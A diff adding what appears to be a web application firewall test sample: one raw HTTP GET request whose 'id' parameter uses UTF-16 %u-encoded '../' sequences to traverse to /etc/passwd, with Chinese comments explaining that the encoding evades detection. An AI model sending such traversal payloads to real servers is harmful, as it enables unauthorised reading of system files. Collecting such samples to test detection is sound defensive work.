@@ -1,0 +1,9 @@
+# 目录遍历(UTF-16编码)-06506935
+# 攻击者通过构造此语句可以遍历目录访问系统用户配置文件，使用16位Unicode编码绕过检测还可以构造其他文件路径爆破更多敏感信息。
+GET /?id=%25u002e%25u002e%25u2215%25u002e%25u002e%25u2215%25u002e%25u002e%25u2215%25u002e%25u002e%25u2215%25u002e%25u002e%25u2215%25u002e%25u002e%25u2215%25u002e%25u002e%25u2215%25u002e%25u002e%25u2215etc%25u2215passwd&bid=hd_tag_m8mv24nh HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24nh
+RM-PRO-Token: 51f2d391c9be4524af1d32dba0fed77d
+RM-PRO-Time: 1742808395127
+User-Agent: curl/7.83.1
+
